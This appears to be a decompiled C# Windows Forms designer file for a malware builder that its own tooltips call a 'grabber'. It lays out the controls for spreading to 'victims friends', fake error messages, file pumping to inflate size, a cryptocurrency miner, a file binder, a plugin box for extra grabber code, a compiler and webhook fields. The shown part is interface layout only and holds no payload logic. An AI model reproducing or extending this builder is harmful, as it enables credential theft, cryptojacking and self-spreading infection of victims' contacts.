			((Control)(object)moneroMinerCheckBox).AutoSize = true;
			((Control)(object)moneroMinerCheckBox).Location = new Point(235, 129);
			((Control)(object)moneroMinerCheckBox).Name = "moneroMinerCheckBox";
			((Control)(object)moneroMinerCheckBox).Size = new Size(99, 15);
			((Control)(object)moneroMinerCheckBox).TabIndex = 49;
			((Control)(object)moneroMinerCheckBox).Text = "Monero Miner";
			moneroMinerCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)moneroMinerCheckBox, "Mines bitcoin to your wallet address");
			moneroMinerCheckBox.set_UseSelectable(true);
			((CheckBox)(object)moneroMinerCheckBox).CheckedChanged += bitcoinMinerCheckBox_CheckedChanged;
			((Control)(object)chooseIconButton).Enabled = false;
			chooseIconButton.set_Highlight(true);
			((Control)(object)chooseIconButton).Location = new Point(30, 83);
			((Control)(object)chooseIconButton).Name = "chooseIconButton";
			((Control)(object)chooseIconButton).Size = new Size(114, 22);
			((Control)(object)chooseIconButton).TabIndex = 45;
			((Control)(object)chooseIconButton).Text = "Choose Icon";
			chooseIconButton.set_Theme((MetroThemeStyle)2);
			chooseIconButton.set_UseSelectable(true);
			((Control)(object)chooseIconButton).Click += chooseIconButton_Click;
			((Control)(object)comingSoonPanel3).BackColor = Color.Transparent;
			((Panel)(object)comingSoonPanel3).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)comingSoonPanel3).Controls.Add((Control)(object)comingSoonLabel3);
			((Control)(object)comingSoonPanel3).ForeColor = Color.White;
			comingSoonPanel3.set_HorizontalScrollbarBarColor(true);
			comingSoonPanel3.set_HorizontalScrollbarHighlightOnWheel(false);
			comingSoonPanel3.set_HorizontalScrollbarSize(10);
			((Control)(object)comingSoonPanel3).Location = new Point(644, 129);
			((Control)(object)comingSoonPanel3).Name = "comingSoonPanel3";
			((Control)(object)comingSoonPanel3).Size = new Size(167, 73);
			((Control)(object)comingSoonPanel3).TabIndex = 42;
			comingSoonPanel3.set_Theme((MetroThemeStyle)2);
			comingSoonPanel3.set_VerticalScrollbarBarColor(true);
			comingSoonPanel3.set_VerticalScrollbarHighlightOnWheel(false);
			comingSoonPanel3.set_VerticalScrollbarSize(10);
			((Control)(object)comingSoonLabel3).AutoSize = true;
			((Control)(object)comingSoonLabel3).Location = new Point(36, 25);
			((Control)(object)comingSoonLabel3).Name = "comingSoonLabel3";
			((Control)(object)comingSoonLabel3).Size = new Size(90, 19);
			((Control)(object)comingSoonLabel3).TabIndex = 4;
			((Control)(object)comingSoonLabel3).Text = "Coming Soon";
			comingSoonLabel3.set_Theme((MetroThemeStyle)2);
			((Control)(object)comingSoonPanel2).BackColor = Color.Transparent;
			((Panel)(object)comingSoonPanel2).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)comingSoonPanel2).Controls.Add((Control)(object)comingSoonLabel2);
			((Control)(object)comingSoonPanel2).ForeColor = Color.White;
			comingSoonPanel2.set_HorizontalScrollbarBarColor(true);
			comingSoonPanel2.set_HorizontalScrollbarHighlightOnWheel(false);
			comingSoonPanel2.set_HorizontalScrollbarSize(10);
			((Control)(object)comingSoonPanel2).Location = new Point(433, 129);
			((Control)(object)comingSoonPanel2).Name = "comingSoonPanel2";
			((Control)(object)comingSoonPanel2).Size = new Size(167, 73);
			((Control)(object)comingSoonPanel2).TabIndex = 41;
			comingSoonPanel2.set_Theme((MetroThemeStyle)2);
			comingSoonPanel2.set_VerticalScrollbarBarColor(true);
			comingSoonPanel2.set_VerticalScrollbarHighlightOnWheel(false);
			comingSoonPanel2.set_VerticalScrollbarSize(10);
			((Control)(object)comingSoonLabel2).AutoSize = true;
			((Control)(object)comingSoonLabel2).Location = new Point(36, 25);
			((Control)(object)comingSoonLabel2).Name = "comingSoonLabel2";
			((Control)(object)comingSoonLabel2).Size = new Size(90, 19);
			((Control)(object)comingSoonLabel2).TabIndex = 3;
			((Control)(object)comingSoonLabel2).Text = "Coming Soon";
			comingSoonLabel2.set_Theme((MetroThemeStyle)2);
			spreadMessage.get_CustomButton().set_Image((Image)null);
			((Control)(object)spreadMessage.get_CustomButton()).Location = new Point(119, 2);
			((Control)(object)spreadMessage.get_CustomButton()).Name = "";
			((Control)(object)spreadMessage.get_CustomButton()).Size = new Size(45, 45);
			spreadMessage.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)spreadMessage.get_CustomButton()).TabIndex = 1;
			spreadMessage.get_CustomButton().set_Theme((MetroThemeStyle)1);
			spreadMessage.get_CustomButton().set_UseSelectable(true);
			((Control)(object)spreadMessage.get_CustomButton()).Visible = false;
			((Control)(object)spreadMessage).Enabled = false;
			((Control)(object)spreadMessage).ForeColor = Color.White;
			spreadMessage.set_Lines(new string[0]);
			((Control)(object)spreadMessage).Location = new Point(30, 152);
			spreadMessage.set_MaxLength(32767);
			spreadMessage.set_Multiline(true);
			((Control)(object)spreadMessage).Name = "spreadMessage";
			spreadMessage.set_PasswordChar('\0');
			spreadMessage.set_PromptText("Spread Message");
			spreadMessage.set_ScrollBars(ScrollBars.None);
			spreadMessage.set_SelectedText("");
			spreadMessage.set_SelectionLength(0);
			spreadMessage.set_SelectionStart(0);
			spreadMessage.set_ShortcutsEnabled(true);
			((Control)(object)spreadMessage).Size = new Size(167, 50);
			((Control)(object)spreadMessage).TabIndex = 39;
			spreadMessage.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)spreadMessage, "Message that will be sent to victims friends");
			spreadMessage.set_UseSelectable(true);
			spreadMessage.set_WaterMark("Spread Message");
			spreadMessage.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			spreadMessage.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)autoSpreadCheckBox).AutoSize = true;
			((Control)(object)autoSpreadCheckBox).Location = new Point(30, 129);
			((Control)(object)autoSpreadCheckBox).Name = "autoSpreadCheckBox";
			((Control)(object)autoSpreadCheckBox).Size = new Size(88, 15);
			((Control)(object)autoSpreadCheckBox).TabIndex = 38;
			((Control)(object)autoSpreadCheckBox).Text = "Auto Spread";
			autoSpreadCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)autoSpreadCheckBox, "Automatically sends the grabber to victims friends");
			autoSpreadCheckBox.set_UseSelectable(true);
			((CheckBox)(object)autoSpreadCheckBox).CheckedChanged += autoSpreadCheckBox_CheckedChanged;
			((Control)(object)embedColorCheckBox).AutoSize = true;
			((Control)(object)embedColorCheckBox).Location = new Point(644, 32);
			((Control)(object)embedColorCheckBox).Name = "embedColorCheckBox";
			((Control)(object)embedColorCheckBox).Size = new Size(137, 15);
			((Control)(object)embedColorCheckBox).TabIndex = 37;
			((Control)(object)embedColorCheckBox).Text = "Custom Embed Color";
			embedColorCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)embedColorCheckBox, "Color of the embed that grabber sends");
			embedColorCheckBox.set_UseSelectable(true);
			((CheckBox)(object)embedColorCheckBox).CheckedChanged += embedColorCheckBox_CheckedChanged;
			errorTitleTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)errorTitleTextBox.get_CustomButton()).Location = new Point(147, 2);
			((Control)(object)errorTitleTextBox.get_CustomButton()).Name = "";
			((Control)(object)errorTitleTextBox.get_CustomButton()).Size = new Size(17, 17);
			errorTitleTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)errorTitleTextBox.get_CustomButton()).TabIndex = 1;
			errorTitleTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			errorTitleTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)errorTitleTextBox.get_CustomButton()).Visible = false;
			((Control)(object)errorTitleTextBox).Enabled = false;
			((Control)(object)errorTitleTextBox).ForeColor = Color.White;
			errorTitleTextBox.set_Lines(new string[0]);
			((Control)(object)errorTitleTextBox).Location = new Point(433, 55);
			errorTitleTextBox.set_MaxLength(32767);
			((Control)(object)errorTitleTextBox).Name = "errorTitleTextBox";
			errorTitleTextBox.set_PasswordChar('\0');
			errorTitleTextBox.set_PromptText("Fake Error Title");
			errorTitleTextBox.set_ScrollBars(ScrollBars.None);
			errorTitleTextBox.set_SelectedText("");
			errorTitleTextBox.set_SelectionLength(0);
			errorTitleTextBox.set_SelectionStart(0);
			errorTitleTextBox.set_ShortcutsEnabled(true);
			((Control)(object)errorTitleTextBox).Size = new Size(167, 22);
			((Control)(object)errorTitleTextBox).TabIndex = 8;
			errorTitleTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)errorTitleTextBox, "Title of the error message");
			errorTitleTextBox.set_UseSelectable(true);
			errorTitleTextBox.set_WaterMark("Fake Error Title");
			errorTitleTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			errorTitleTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			embedColorPictureBox.BackColor = Color.Transparent;
			embedColorPictureBox.BorderStyle = BorderStyle.FixedSingle;
			embedColorPictureBox.Location = new Point(761, 55);
			embedColorPictureBox.Name = "embedColorPictureBox";
			embedColorPictureBox.Size = new Size(50, 50);
			embedColorPictureBox.TabIndex = 35;
			embedColorPictureBox.TabStop = false;
			iconPictureBox.BackColor = Color.Transparent;
			iconPictureBox.BorderStyle = BorderStyle.FixedSingle;
			iconPictureBox.Enabled = false;
			iconPictureBox.Location = new Point(150, 55);
			iconPictureBox.Name = "iconPictureBox";
			iconPictureBox.Size = new Size(50, 50);
			iconPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
			iconPictureBox.TabIndex = 33;
			iconPictureBox.TabStop = false;
			errorMessageTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)errorMessageTextBox.get_CustomButton()).Location = new Point(147, 2);
			((Control)(object)errorMessageTextBox.get_CustomButton()).Name = "";
			((Control)(object)errorMessageTextBox.get_CustomButton()).Size = new Size(17, 17);
			errorMessageTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)errorMessageTextBox.get_CustomButton()).TabIndex = 1;
			errorMessageTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			errorMessageTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)errorMessageTextBox.get_CustomButton()).Visible = false;
			((Control)(object)errorMessageTextBox).Enabled = false;
			((Control)(object)errorMessageTextBox).ForeColor = Color.White;
			errorMessageTextBox.set_Lines(new string[0]);
			((Control)(object)errorMessageTextBox).Location = new Point(433, 83);
			errorMessageTextBox.set_MaxLength(32767);
			((Control)(object)errorMessageTextBox).Name = "errorMessageTextBox";
			errorMessageTextBox.set_PasswordChar('\0');
			errorMessageTextBox.set_PromptText("Fake Error Message");
			errorMessageTextBox.set_ScrollBars(ScrollBars.None);
			errorMessageTextBox.set_SelectedText("");
			errorMessageTextBox.set_SelectionLength(0);
			errorMessageTextBox.set_SelectionStart(0);
			errorMessageTextBox.set_ShortcutsEnabled(true);
			((Control)(object)errorMessageTextBox).Size = new Size(167, 22);
			((Control)(object)errorMessageTextBox).TabIndex = 9;
			errorMessageTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)errorMessageTextBox, "Message of the error message");
			errorMessageTextBox.set_UseSelectable(true);
			errorMessageTextBox.set_WaterMark("Fake Error Message");
			errorMessageTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			errorMessageTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)iconCheckBox).AutoSize = true;
			((Control)(object)iconCheckBox).Location = new Point(31, 32);
			((Control)(object)iconCheckBox).Name = "iconCheckBox";
			((Control)(object)iconCheckBox).Size = new Size(91, 15);
			((Control)(object)iconCheckBox).TabIndex = 31;
			((Control)(object)iconCheckBox).Text = "Custom Icon";
			iconCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)iconCheckBox, "Grabber icon");
			iconCheckBox.set_UseSelectable(true);
			((CheckBox)(object)iconCheckBox).CheckedChanged += iconCheckBox_CheckedChanged;
			((Control)(object)fakeErrorCheckBox).AutoSize = true;
			((Control)(object)fakeErrorCheckBox).Location = new Point(433, 32);
			((Control)(object)fakeErrorCheckBox).Name = "fakeErrorCheckBox";
			((Control)(object)fakeErrorCheckBox).Size = new Size(75, 15);
			((Control)(object)fakeErrorCheckBox).TabIndex = 14;
			((Control)(object)fakeErrorCheckBox).Text = "Fake Error";
			fakeErrorCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)fakeErrorCheckBox, "Shows a messagebox when the grabber opens");
			fakeErrorCheckBox.set_UseSelectable(true);
			((CheckBox)(object)fakeErrorCheckBox).CheckedChanged += fakeErrorCheckBox_CheckedChanged;
			iconPathTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)iconPathTextBox.get_CustomButton()).Location = new Point(93, 2);
			((Control)(object)iconPathTextBox.get_CustomButton()).Name = "";
			((Control)(object)iconPathTextBox.get_CustomButton()).Size = new Size(17, 17);
			iconPathTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)iconPathTextBox.get_CustomButton()).TabIndex = 1;
			iconPathTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			iconPathTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)iconPathTextBox.get_CustomButton()).Visible = false;
			((Control)(object)iconPathTextBox).Enabled = false;
			((Control)(object)iconPathTextBox).ForeColor = Color.White;
			iconPathTextBox.set_Lines(new string[0]);
			((Control)(object)iconPathTextBox).Location = new Point(31, 55);
			iconPathTextBox.set_MaxLength(32767);
			((Control)(object)iconPathTextBox).Name = "iconPathTextBox";
			iconPathTextBox.set_PasswordChar('\0');
			iconPathTextBox.set_PromptText("Icon Path");
			iconPathTextBox.set_ReadOnly(true);
			iconPathTextBox.set_ScrollBars(ScrollBars.None);
			iconPathTextBox.set_SelectedText("");
			iconPathTextBox.set_SelectionLength(0);
			iconPathTextBox.set_SelectionStart(0);
			iconPathTextBox.set_ShortcutsEnabled(true);
			((Control)(object)iconPathTextBox).Size = new Size(113, 22);
			((Control)(object)iconPathTextBox).TabIndex = 30;
			iconPathTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)iconPathTextBox, "Path to the icon");
			iconPathTextBox.set_UseSelectable(true);
			iconPathTextBox.set_WaterMark("Icon Path");
			iconPathTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			iconPathTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			pumpAmountTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)pumpAmountTextBox.get_CustomButton()).Location = new Point(147, 2);
			((Control)(object)pumpAmountTextBox.get_CustomButton()).Name = "";
			((Control)(object)pumpAmountTextBox.get_CustomButton()).Size = new Size(17, 17);
			pumpAmountTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)pumpAmountTextBox.get_CustomButton()).TabIndex = 1;
			pumpAmountTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			pumpAmountTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)pumpAmountTextBox.get_CustomButton()).Visible = false;
			((Control)(object)pumpAmountTextBox).Enabled = false;
			((Control)(object)pumpAmountTextBox).ForeColor = Color.White;
			pumpAmountTextBox.set_Lines(new string[0]);
			((Control)(object)pumpAmountTextBox).Location = new Point(235, 55);
			pumpAmountTextBox.set_MaxLength(32767);
			((Control)(object)pumpAmountTextBox).Name = "pumpAmountTextBox";
			pumpAmountTextBox.set_PasswordChar('\0');
			pumpAmountTextBox.set_PromptText("Pump Amount");
			pumpAmountTextBox.set_ScrollBars(ScrollBars.None);
			pumpAmountTextBox.set_SelectedText("");
			pumpAmountTextBox.set_SelectionLength(0);
			pumpAmountTextBox.set_SelectionStart(0);
			pumpAmountTextBox.set_ShortcutsEnabled(true);
			((Control)(object)pumpAmountTextBox).Size = new Size(167, 22);
			((Control)(object)pumpAmountTextBox).TabIndex = 25;
			pumpAmountTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)pumpAmountTextBox, "Amount of bytes to pump in the grabber");
			pumpAmountTextBox.set_UseSelectable(true);
			pumpAmountTextBox.set_WaterMark("Pump Amount");
			pumpAmountTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			pumpAmountTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)byteCheckBox).AutoSize = true;
			((Control)(object)byteCheckBox).Enabled = false;
			byteCheckBox.set_FontSize((MetroCheckBoxSize)1);
			((Control)(object)byteCheckBox).Location = new Point(235, 85);
			((Control)(object)byteCheckBox).Name = "byteCheckBox";
			((Control)(object)byteCheckBox).Size = new Size(33, 19);
			((Control)(object)byteCheckBox).TabIndex = 27;
			((Control)(object)byteCheckBox).Text = "B";
			byteCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)byteCheckBox, "Bytes");
			byteCheckBox.set_UseSelectable(true);
			((Control)(object)kiloByteCheckBox).AutoSize = true;
			((Control)(object)kiloByteCheckBox).Enabled = false;
			kiloByteCheckBox.set_FontSize((MetroCheckBoxSize)1);
			((Control)(object)kiloByteCheckBox).Location = new Point(290, 85);
			((Control)(object)kiloByteCheckBox).Name = "kiloByteCheckBox";
			((Control)(object)kiloByteCheckBox).Size = new Size(41, 19);
			((Control)(object)kiloByteCheckBox).TabIndex = 28;
			((Control)(object)kiloByteCheckBox).Text = "KB";
			kiloByteCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)kiloByteCheckBox, "Kilobytes");
			kiloByteCheckBox.set_UseSelectable(true);
			((Control)(object)filePumperCheckBox).AutoSize = true;
			((Control)(object)filePumperCheckBox).Location = new Point(235, 32);
			((Control)(object)filePumperCheckBox).Name = "filePumperCheckBox";
			((Control)(object)filePumperCheckBox).Size = new Size(86, 15);
			((Control)(object)filePumperCheckBox).TabIndex = 26;
			((Control)(object)filePumperCheckBox).Text = "File Pumper";
			filePumperCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)filePumperCheckBox, "Makes the grabber file size bigger");
			filePumperCheckBox.set_UseSelectable(true);
			((CheckBox)(object)filePumperCheckBox).CheckedChanged += filePumperCheckBox_CheckedChanged;
			((Control)(object)megaByteCheckBox).AutoSize = true;
			((Control)(object)megaByteCheckBox).Enabled = false;
			megaByteCheckBox.set_FontSize((MetroCheckBoxSize)1);
			((Control)(object)megaByteCheckBox).Location = new Point(355, 85);
			((Control)(object)megaByteCheckBox).Name = "megaByteCheckBox";
			((Control)(object)megaByteCheckBox).Size = new Size(46, 19);
			((Control)(object)megaByteCheckBox).TabIndex = 29;
			((Control)(object)megaByteCheckBox).Text = "MB";
			megaByteCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)megaByteCheckBox, "Megabytes");
			megaByteCheckBox.set_UseSelectable(true);
			((Panel)(object)pluginsTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)pluginsTab).Controls.Add((Control)(object)pluginTextBox);
			pluginsTab.set_HorizontalScrollbarBarColor(true);
			pluginsTab.set_HorizontalScrollbarHighlightOnWheel(false);
			pluginsTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)pluginsTab).Location = new Point(4, 35);
			((Control)(object)pluginsTab).Name = "pluginsTab";
			((Control)(object)pluginsTab).Size = new Size(845, 237);
			((TabPage)(object)pluginsTab).TabIndex = 3;
			((Control)(object)pluginsTab).Text = "Plugins";
			pluginsTab.set_Theme((MetroThemeStyle)2);
			pluginsTab.set_VerticalScrollbarBarColor(true);
			pluginsTab.set_VerticalScrollbarHighlightOnWheel(false);
			pluginsTab.set_VerticalScrollbarSize(10);
			pluginTextBox.set_AutoCompleteBracketsList(new char[10] { '(', ')', '{', '}', '[', ']', '"', '"', '\'', '\'' });
			pluginTextBox.set_AutoIndentCharsPatterns("\r\n^\\s*[\\w\\.]+(\\s\\w+)?\\s*(?<range>=)\\s*(?<range>[^;]+);\r\n^\\s*(case|default)\\s*[^:]*(?<range>:)\\s*(?<range>[^;]+);\r\n");
			pluginTextBox.set_AutoScrollMinSize(new Size(2, 14));
			pluginTextBox.set_BackBrush((Brush)null);
			((Control)(object)pluginTextBox).BackColor = Color.FromArgb(17, 17, 17);
			((UserControl)(object)pluginTextBox).BorderStyle = BorderStyle.FixedSingle;
			pluginTextBox.set_BracketsHighlightStrategy((BracketsHighlightStrategy)1);
			pluginTextBox.set_CharHeight(14);
			pluginTextBox.set_CharWidth(8);
			((Control)(object)pluginTextBox).Cursor = Cursors.IBeam;
			pluginTextBox.set_DisabledColor(Color.FromArgb(100, 180, 180, 180));
			pluginTextBox.set_HighlightingRangeType((HighlightingRangeType)1);
			pluginTextBox.set_IndentBackColor(Color.FromArgb(17, 17, 17));
			pluginTextBox.set_IsReplaceMode(false);
			pluginTextBox.set_Language((Language)1);
			pluginTextBox.set_LeftBracket('(');
			pluginTextBox.set_LeftBracket2('{');
			pluginTextBox.set_LineNumberColor(Color.White);
			((Control)(object)pluginTextBox).Location = new Point(31, 29);
			((Control)(object)pluginTextBox).Name = "pluginTextBox";
			pluginTextBox.set_Paddings(new Padding(0));
			pluginTextBox.set_RightBracket(')');
			pluginTextBox.set_RightBracket2('}');
			pluginTextBox.set_SelectionColor(Color.FromArgb(60, 0, 0, 255));
			pluginTextBox.set_ServiceColors((ServiceColors)componentResourceManager.GetObject("pluginTextBox.ServiceColors"));
			((Control)(object)pluginTextBox).Size = new Size(781, 174);
			((Control)(object)pluginTextBox).TabIndex = 3;
			metroToolTip.SetToolTip((Control)(object)pluginTextBox, "Extra code to add to the grabber");
			pluginTextBox.set_Zoom(100);
			((Panel)(object)binderTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)binderTab).Controls.Add((Control)(object)removeButton);
			((Control)(object)binderTab).Controls.Add(filesListView);
			((Control)(object)binderTab).Controls.Add((Control)(object)addButton);
			binderTab.set_HorizontalScrollbarBarColor(true);
			binderTab.set_HorizontalScrollbarHighlightOnWheel(false);
			binderTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)binderTab).Location = new Point(4, 35);
			((Control)(object)binderTab).Name = "binderTab";
			((Control)(object)binderTab).Size = new Size(845, 237);
			((TabPage)(object)binderTab).TabIndex = 4;
			((Control)(object)binderTab).Text = "Binder";
			binderTab.set_Theme((MetroThemeStyle)2);
			binderTab.set_VerticalScrollbarBarColor(true);
			binderTab.set_VerticalScrollbarHighlightOnWheel(false);
			binderTab.set_VerticalScrollbarSize(10);
			removeButton.set_Highlight(true);
			((Control)(object)removeButton).Location = new Point(425, 171);
			((Control)(object)removeButton).Name = "removeButton";
			((Control)(object)removeButton).Size = new Size(388, 32);
			((Control)(object)removeButton).TabIndex = 43;
			((Control)(object)removeButton).Text = "Remove";
			removeButton.set_Theme((MetroThemeStyle)2);
			removeButton.set_UseSelectable(true);
			((Control)(object)removeButton).Click += removeButton_Click;
			filesListView.BackColor = Color.FromArgb(17, 17, 17);
			filesListView.Columns.AddRange(new ColumnHeader[2] { fileNameHeader, fileSizeHeader });
			filesListView.Font = new Font("Segoe UI Semibold", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			filesListView.ForeColor = Color.White;
			filesListView.FullRowSelect = true;
			filesListView.HideSelection = false;
			filesListView.Location = new Point(31, 30);
			filesListView.Margin = new Padding(4);
			filesListView.Name = "filesListView";
			filesListView.Size = new Size(782, 135);
			filesListView.TabIndex = 42;
			filesListView.UseCompatibleStateImageBehavior = false;
			filesListView.View = View.Details;
			fileNameHeader.Text = "File Name";
			fileNameHeader.Width = 389;
			fileSizeHeader.Text = "File Size";
			fileSizeHeader.Width = 389;
			addButton.set_Highlight(true);
			((Control)(object)addButton).Location = new Point(31, 171);
			((Control)(object)addButton).Name = "addButton";
			((Control)(object)addButton).Size = new Size(388, 32);
			((Control)(object)addButton).TabIndex = 41;
			((Control)(object)addButton).Text = "Add";
			addButton.set_Theme((MetroThemeStyle)2);
			addButton.set_UseSelectable(true);
			((Control)(object)addButton).Click += addButton_Click;
			((Panel)(object)compilerTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)compilerTab).Controls.Add((Control)(object)compileButton);
			((Control)(object)compilerTab).Controls.Add((Control)(object)compilerOutputTextBox);
			compilerTab.set_HorizontalScrollbarBarColor(true);
			compilerTab.set_HorizontalScrollbarHighlightOnWheel(false);
			compilerTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)compilerTab).Location = new Point(4, 35);
			((Control)(object)compilerTab).Name = "compilerTab";
			((Control)(object)compilerTab).Size = new Size(845, 237);
			((TabPage)(object)compilerTab).TabIndex = 2;
			((Control)(object)compilerTab).Text = "Compiler";
			compilerTab.set_Theme((MetroThemeStyle)2);
			compilerTab.set_VerticalScrollbarBarColor(true);
			compilerTab.set_VerticalScrollbarHighlightOnWheel(false);
			compilerTab.set_VerticalScrollbarSize(10);
			compileButton.set_Highlight(true);
			((Control)(object)compileButton).Location = new Point(32, 171);
			((Control)(object)compileButton).Name = "compileButton";
			((Control)(object)compileButton).Size = new Size(781, 32);
			((Control)(object)compileButton).TabIndex = 39;
			((Control)(object)compileButton).Text = "Compile";
			compileButton.set_Theme((MetroThemeStyle)2);
			compileButton.set_UseSelectable(true);
			((Control)(object)compileButton).Click += compileButton_Click;
			compilerOutputTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)compilerOutputTextBox.get_CustomButton()).Location = new Point(647, 1);
			((Control)(object)compilerOutputTextBox.get_CustomButton()).Name = "";
			((Control)(object)compilerOutputTextBox.get_CustomButton()).Size = new Size(133, 133);
			compilerOutputTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)compilerOutputTextBox.get_CustomButton()).TabIndex = 1;
			compilerOutputTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			compilerOutputTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)compilerOutputTextBox.get_CustomButton()).Visible = false;
			compilerOutputTextBox.set_FontWeight((MetroTextBoxWeight)2);
			((Control)(object)compilerOutputTextBox).ForeColor = Color.White;
			compilerOutputTextBox.set_Lines(new string[0]);
			((Control)(object)compilerOutputTextBox).Location = new Point(32, 30);
			compilerOutputTextBox.set_MaxLength(32767);
			compilerOutputTextBox.set_Multiline(true);
			((Control)(object)compilerOutputTextBox).Name = "compilerOutputTextBox";
			compilerOutputTextBox.set_PasswordChar('\0');
			compilerOutputTextBox.set_PromptText("Waiting for compiling...");
			compilerOutputTextBox.set_ReadOnly(true);
			compilerOutputTextBox.set_ScrollBars(ScrollBars.Vertical);
			compilerOutputTextBox.set_SelectedText("");
			compilerOutputTextBox.set_SelectionLength(0);
			compilerOutputTextBox.set_SelectionStart(0);
			compilerOutputTextBox.set_ShortcutsEnabled(true);
			((Control)(object)compilerOutputTextBox).Size = new Size(781, 135);
			((Control)(object)compilerOutputTextBox).TabIndex = 3;
			compilerOutputTextBox.set_Theme((MetroThemeStyle)2);
			compilerOutputTextBox.set_UseSelectable(true);
			compilerOutputTextBox.set_WaterMark("Waiting for compiling...");
			compilerOutputTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			compilerOutputTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			webhookGroupBox.BackColor = Color.Transparent;
			webhookGroupBox.Controls.Add((Control)(object)webhookIDbox);
			webhookGroupBox.Controls.Add((Control)(object)emailCheckBox1);
			webhookGroupBox.Controls.Add((Control)(object)testWebhookButton);
			webhookGroupBox.Controls.Add((Control)(object)webhookTextBox);
			webhookGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			webhookGroupBox.ForeColor = Color.White;
			webhookGroupBox.Location = new Point(30, 19);
			webhookGroupBox.Name = "webhookGroupBox";
			webhookGroupBox.Size = new Size(845, 74);
			webhookGroupBox.TabIndex = 19;
			webhookGroupBox.TabStop = false;
			webhookGroupBox.Text = "Webhook";
			webhookGroupBox.Enter += webhookGroupBox_Enter;
			webhookIDbox.get_CustomButton().set_Image((Image)null);
			((Control)(object)webhookIDbox.get_CustomButton()).Location = new Point(203, 2);
			((Control)(object)webhookIDbox.get_CustomButton()).Name = "";
			((Control)(object)webhookIDbox.get_CustomButton()).Size = new Size(17, 17);
			webhookIDbox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)webhookIDbox.get_CustomButton()).TabIndex = 1;
			webhookIDbox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			webhookIDbox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)webhookIDbox.get_CustomButton()).Visible = false;
			((Control)(object)webhookIDbox).ForeColor = Color.White;
			webhookIDbox.set_Lines(new string[0]);
			((Control)(object)webhookIDbox).Location = new Point(464, 30);
			webhookIDbox.set_MaxLength(32767);
			((Control)(object)webhookIDbox).Name = "webhookIDbox";
			webhookIDbox.set_PasswordChar('\0');
			webhookIDbox.set_PromptText("Webhook ID");
			webhookIDbox.set_ScrollBars(ScrollBars.None);
			webhookIDbox.set_SelectedText("");
			webhookIDbox.set_SelectionLength(0);
			webhookIDbox.set_SelectionStart(0);
			webhookIDbox.set_ShortcutsEnabled(true);
			((Control)(object)webhookIDbox).Size = new Size(223, 22);
			((Control)(object)webhookIDbox).TabIndex = 39;
			webhookIDbox.set_Theme((MetroThemeStyle)2);
